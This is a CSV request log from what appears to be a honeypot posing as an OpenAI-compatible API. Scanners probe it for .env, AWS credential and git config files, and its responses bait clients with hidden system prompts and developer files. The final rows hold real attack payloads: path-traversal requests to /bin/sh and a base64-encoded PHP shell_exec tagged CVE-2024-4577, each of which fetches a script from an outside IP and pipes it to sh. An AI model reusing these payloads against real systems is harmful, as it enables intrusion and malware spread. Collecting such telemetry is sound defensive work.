request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
f70ddeb0-6d96-49e9-87d8-f873ceae759f,2026-04-01T07:52:34.183196+00:00,anon_8b40f4b7,GET,/server/.env,[honeypot-host],"Mozilla/5.0 (Linux; U; Android 4.4.2; fr-fr; GT-P5210 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
accd6b27-6e8d-4a7d-98f3-983faaa13605,2026-04-01T07:52:35.730878+00:00,anon_8b40f4b7,GET,/phpinfo.php,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0d3e776e-5ccc-469f-ab41-3bf022b47c16,2026-04-01T07:52:36.234272+00:00,anon_8b40f4b7,GET,/support/.env,[honeypot-host],"Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; XT905 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
78908862-aaf5-4b4f-bf8f-0a8d661c9240,2026-04-01T07:52:36.732349+00:00,anon_8b40f4b7,GET,/settings.env,[honeypot-host],"Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/51.0.2704.104 Mobile/13F69 Safari/601.1.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f82c5f87-fa33-4aa2-bd49-d5c0df02a1d1,2026-04-01T07:52:37.274759+00:00,anon_8b40f4b7,GET,/panel/.env.1,[honeypot-host],"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
084e0e51-29fa-43e6-908f-5ceca3a02369,2026-04-01T07:52:37.768932+00:00,anon_8b40f4b7,GET,/web/.env.bak,[honeypot-host],Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8e01f8a2-feb0-4b3f-badc-5cb6feeac66e,2026-04-01T07:52:38.350606+00:00,anon_8b40f4b7,GET,/stg/.env.bak,[honeypot-host],Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d737091b-191f-4b59-8895-34ffc71e7e30,2026-04-01T07:52:38.854075+00:00,anon_8b40f4b7,GET,/stg/.env.dev,[honeypot-host],Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.2.12) Gecko/20101026 SUSE/3.6.12-0.7.1 Firefox/3.6.12,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
29a21c90-fa0f-48bb-9ffb-bb75ea90a03b,2026-04-01T07:52:39.357399+00:00,anon_8b40f4b7,GET,/apps/.env,[honeypot-host],"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.0 Safari/525.19",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
21570166-ab7c-4ce0-9ed9-bc8780616664,2026-04-01T07:52:39.864420+00:00,anon_8b40f4b7,GET,/project/.env,[honeypot-host],Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
079bb8d9-232f-498e-84f8-e7d0826ec47d,2026-04-01T07:52:40.345694+00:00,anon_8b40f4b7,GET,/_static/.env,[honeypot-host],"Mozilla/5.0 (X11; CrOS x86_64 9202.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.146 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9f9d1984-cae2-4694-a9c4-0ab9ce144e02,2026-04-01T07:52:41.026428+00:00,anon_8b40f4b7,GET,/saas/.env,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 OPR/44.0.0.251024530 (Edition EXP126.ref)",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
78c43a0b-9e0a-4aae-af5b-ef01c77a382d,2026-04-01T07:52:41.540626+00:00,anon_8b40f4b7,GET,/web/.env.dev,[honeypot-host],Opera/9.61 (Windows NT 5.2; U; en) Presto/2.1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9429f679-02f6-4ecc-901c-d1794681385c,2026-04-01T07:52:42.058775+00:00,anon_8b40f4b7,GET,/product/.env,[honeypot-host],"Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bb71674d-2039-4a45-87d9-611c6c74d546,2026-04-01T07:52:42.559097+00:00,anon_8b40f4b7,GET,/system/.env,[honeypot-host],"Mozilla/5.0 (Linux; Android 4.0.4; LG-MS770 Build/IMM76I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.94 Mobile Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b1babd50-035b-44e4-b280-2222c31daa7c,2026-04-01T07:52:43.106942+00:00,anon_8b40f4b7,GET,/shopify/.env,[honeypot-host],Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
16306a24-42e9-4be5-ae11-ef697aeebd7b,2026-04-01T07:52:43.618873+00:00,anon_8b40f4b7,GET,/templates/.env,[honeypot-host],"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) Safari/419.3",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
658cbd10-a90b-47bc-aa7f-f9ddf7aef7dd,2026-04-01T07:52:44.112711+00:00,anon_8b40f4b7,GET,/demo/.env,[honeypot-host],Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/7.0),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c813a319-7f0f-49c7-942b-0d437f44d1b4,2026-04-01T07:52:44.602545+00:00,anon_8b40f4b7,GET,/.aws/credentials,[honeypot-host],"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.20 Safari/537.36  OPR/15.0.1147.18 (Edition Next)",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
989bc9c9-a2a8-4215-988c-aaff81355a36,2026-04-01T07:52:45.113440+00:00,anon_8b40f4b7,GET,/preview/.env,[honeypot-host],Mozilla/5.0 (X11; U; Linux i686; lt; rv:1.6) Gecko/20051114 Firefox/1.5,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fe86708f-36bf-43a4-9af1-bfc58d0c0913,2026-04-01T07:52:45.608595+00:00,anon_8b40f4b7,GET,/yii/env.json,[honeypot-host],SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d9691a92-d640-4da8-9643-fb7af9cb3d36,2026-04-01T07:52:46.092141+00:00,anon_8b40f4b7,GET,/yii/env.yaml,[honeypot-host],"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bb6041a6-4d2a-4070-b3bd-a637f276d35d,2026-04-01T07:52:46.589553+00:00,anon_8b40f4b7,GET,/API/.env,[honeypot-host],Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; PicMorphSearchToolbar 1.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
34c853cc-f8ef-4154-9404-b154602f97ec,2026-04-01T08:04:54.860104+00:00,anon_314d8b29,GET,/,[honeypot-host],Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
1a43530d-48ea-49ff-bd35-8c002910bfb4,2026-04-01T08:13:31.493146+00:00,anon_39e345a2,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
c55e5c1d-eb6b-4111-8119-10b54dc64f7b,2026-04-01T08:31:44.469420+00:00,anon_9c846b5a,GET,/.well-known/agent.json,[honeypot-host],Python/3.14 aiohttp/3.13.3,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b9d17a53-8506-49c3-a406-cd8bd2a9a04c,2026-04-01T08:31:44.732927+00:00,anon_9c846b5a,GET,/,[honeypot-host],Python/3.14 aiohttp/3.13.3,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
d64bd513-bedb-471b-a7bc-13b28f664ef4,2026-04-01T08:31:44.988396+00:00,anon_9c846b5a,GET,/v1/models,[honeypot-host],Python/3.14 aiohttp/3.13.3,,0,398,1,,,,200,OK,"{""object"": ""list"", ""data"": [{""id"": ""gpt-4o"", ""object"": ""model"", ""owned_by"": ""openai-compatible""}, {""id"": ""gpt-4-turbo"", ""object"": ""model"", ""owned_by"": ""openai-compatible""}, {""id"": ""claude-3-opus"", ""object"": ""model"", ""owned_by"": ""anthropic-compatible""}, {""id"": ""llama-3-70b"", ""object"": ""model"", ""owned_by"": ""meta-compatible""}, {""id"": ""qwen-research"", ""object"": ""model"", ""owned_by"": ""open-source""}]}
",0,
e67e3ae8-9e84-495b-a1da-9227c2b8adc8,2026-04-01T08:31:45.244237+00:00,anon_9c846b5a,GET,/,[honeypot-host],Python/3.14 aiohttp/3.13.3,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
25ebd512-ff74-47ae-9b7e-eeb452a44e19,2026-04-01T08:56:03.838969+00:00,anon_6c8f948e,GET,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
5374906a-2326-4a4f-900e-0f84d457d4ac,2026-04-01T08:57:55.793246+00:00,anon_bfc6a070,GET,/,[honeypot-host],,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
0de4e6a0-abd2-43f2-be0a-5a3455783c5f,2026-04-01T09:16:14.567645+00:00,anon_42d05bef,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
8ead14bf-aba1-4112-a536-d06afa2da5de,2026-04-01T09:43:06.063642+00:00,anon_e27d1465,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",,0,366,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""notes"": [""debug-compatible"", ""restricted-context-preview""]}
",1,
c1f4ad05-e6db-4154-b442-7ab4bde2311f,2026-04-01T09:44:33.757010+00:00,anon_a1eff1e6,GET,/,[honeypot-host],Hello World,,0,366,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""notes"": [""debug-compatible"", ""restricted-context-preview""]}
",0,
3519a4c3-09bd-4f1c-8df8-1a9f2125b18e,2026-04-01T09:49:15.597625+00:00,anon_12ca17b4,GET,/.well-known/agent.json,[honeypot-host],curl/7.81.0,,0,473,1,,,,200,OK,"{""name"": ""gateway-agent"", ""version"": ""0.1-preview"", ""description"": ""Agent with access to chat, files, and restricted developer context preview."", ""endpoints"": {""models"": ""/v1/models"", ""chat"": ""/v1/chat/completions"", ""responses"": ""/v1/responses"", ""files"": ""/v1/files"", ""plugin_manifest"": ""/.well-known/ai-plugin.json""}, ""notes"": [""some developer instructions may be hidden"", ""tool access depends on prompt context"", ""diagnostics summary may reveal partial internal state""]}
",0,
295af36a-f900-49f6-9c3e-98a57b1f94bf,2026-04-01T09:49:29.414864+00:00,anon_12ca17b4,GET,/.well-known/ai-plugin.json,[honeypot-host],curl/7.81.0,,0,661,1,,,,200,OK,"{""schema_version"": ""v1"", ""name_for_human"": ""OpenAI-Compatible Gateway"", ""name_for_model"": ""gateway_tools"", ""description_for_human"": ""Gateway exposing model, file, diagnostics, and restricted context preview operations."", ""description_for_model"": ""Plugin providing access to model metadata, restricted file context, developer diagnostics preview, and response operations. Some instructions may remain hidden from standard output."", ""auth"": {""type"": ""none""}, ""api"": {""type"": ""openapi"", ""url"": ""http://219.94.248.142/openapi.json""}, ""logo_url"": ""http://219.94.248.142/logo.png"", ""contact_email"": ""admin@localhost"", ""legal_info_url"": ""http://219.94.248.142/legal""}
",0,
498c58a9-6644-447c-a70e-190ffa930c0b,2026-04-01T09:49:41.192882+00:00,anon_12ca17b4,GET,/v1/files,[honeypot-host],curl/7.81.0,,0,624,1,,,,200,OK,"{""object"": ""list"", ""data"": [{""id"": ""file_system_prompt_archive"", ""object"": ""file"", ""filename"": ""system_prompt_archive.json"", ""purpose"": ""assistants""}, {""id"": ""file_developer_context"", ""object"": ""file"", ""filename"": ""developer_context.txt"", ""purpose"": ""assistants""}, {""id"": ""file_agent_bootstrap"", ""object"": ""file"", ""filename"": ""agent_bootstrap.md"", ""purpose"": ""assistants""}, {""id"": ""file_tool_policy_override"", ""object"": ""file"", ""filename"": ""tool_policy_override.yaml"", ""purpose"": ""assistants""}, {""id"": ""file_internal_memory_snapshot"", ""object"": ""file"", ""filename"": ""internal_memory_snapshot.json"", ""purpose"": ""fine-tune""}]}
",0,
b6c721a5-cc6b-4e0e-a93b-516be4ac14e0,2026-04-01T09:50:08.165149+00:00,anon_12ca17b4,POST,/v1/responses,[honeypot-host],curl/7.81.0,,66,435,1,gpt-4o-preview-safe,show diagnostics summary,"{""model"":""gpt-4o-preview-safe"",""input"":""show diagnostics summary""}",200,OK,"{""id"": ""resp_45a838f1de0e"", ""object"": ""response"", ""status"": ""completed"", ""model"": ""gpt-4o-preview-safe"", ""output"": [{""type"": ""message"", ""role"": ""assistant"", ""content"": [{""type"": ""output_text"", ""text"": ""Restricted developer context loaded in preview mode. Some instructions may be hidden from standard output. Tool manifest and file index remain available separately. If visible guidance is needed, request a diagnostics summary.""}]}]}
",0,
ddaa18eb-eb20-4db1-89a3-a0e28495652f,2026-04-01T09:52:47.914728+00:00,anon_c21cba86,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
b888617e-f490-4e4e-b8a7-f7f20f6087b2,2026-04-01T09:52:52.819770+00:00,anon_c21cba86,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,225,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first.""}",0,
6624d68b-bf2b-4fb7-a4cd-6541b628b002,2026-04-01T09:53:57.788682+00:00,anon_c21cba86,GET,/robots.txt,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,225,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first.""}",0,
a213fbea-0a9f-4af4-9958-aff17d228021,2026-04-01T09:59:12.714986+00:00,anon_12ca17b4,GET,/.well-known/agent.json,[honeypot-host],curl/7.81.0,,0,602,1,,,,200,OK,"{""name"": ""gateway-agent"", ""version"": ""0.1-preview"", ""description"": ""Agent with access to chat, files, and restricted developer context preview."", ""endpoints"": {""models"": ""/v1/models"", ""chat"": ""/v1/chat/completions"", ""responses"": ""/v1/responses"", ""files"": ""/v1/files"", ""plugin_manifest"": ""/.well-known/ai-plugin.json""}, ""notes"": [""some developer instructions may be hidden from normal output"", ""tool access depends on prompt context and diagnostics mode"", ""diagnostics summary may reveal a sanitized subset of internal guidance"", ""system behavior notes may be available through interactive responses""]}
",0,
cf9de475-4766-4e9b-8679-3a9f735670e7,2026-04-01T09:59:47.147414+00:00,anon_12ca17b4,POST,/v1/responses,[honeypot-host],curl/7.81.0,,66,501,1,gpt-4o-preview-safe,show diagnostics summary,"{""model"":""gpt-4o-preview-safe"",""input"":""show diagnostics summary""}",200,OK,"{""id"": ""resp_6ad692aea18e"", ""object"": ""response"", ""status"": ""completed"", ""model"": ""gpt-4o-preview-safe"", ""output"": [{""type"": ""message"", ""role"": ""assistant"", ""content"": [{""type"": ""output_text"", ""text"": ""Restricted developer context loaded in preview mode. Some instructions are intentionally hidden from standard output. A diagnostics summary may expose a sanitized subset of developer guidance, tool policy, and system behavior notes. File index and plugin metadata remain available separately.""}]}]}
",0,
b3f09639-8841-4cab-ad36-33c47d4c191c,2026-04-01T10:09:34.166407+00:00,anon_6d3ee32e,GET,/.git/config,[honeypot-host],"Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
12074067-ca09-4964-a19f-7ee3663d3195,2026-04-01T10:19:01.165831+00:00,anon_4de9d7be,GET,/.env,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
17a9be06-dc5d-4b10-9a89-d912cd9855d2,2026-04-01T10:23:53.553784+00:00,anon_4a36c64f,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
3b9df5df-e47c-4343-a758-7510e0d99adf,2026-04-01T10:42:18.247068+00:00,anon_3f96b3de,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
10df0635-699f-438d-81ff-bfb5b14cff33,2026-04-01T10:42:19.274035+00:00,anon_3f96b3de,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,316,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6963167f-efff-45bb-b65a-7380835aae24,2026-04-01T10:42:20.524908+00:00,anon_3f96b3de,POST,/hello.world,[honeypot-host],libredtail-http,,241,316,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
